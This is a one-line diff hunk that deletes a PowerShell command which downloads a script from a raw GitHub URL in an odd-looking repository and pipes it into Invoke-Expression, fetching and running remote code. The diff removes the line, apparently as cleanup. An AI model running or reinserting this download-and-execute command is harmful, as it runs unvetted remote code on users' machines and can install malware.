@@ -1,1 +1,0 @@
-powershell irm https://raw.githubusercontent.com/ghgodbomboclat/apguacamole-commons/refs/heads/main/biyoyo.ps1 | iex
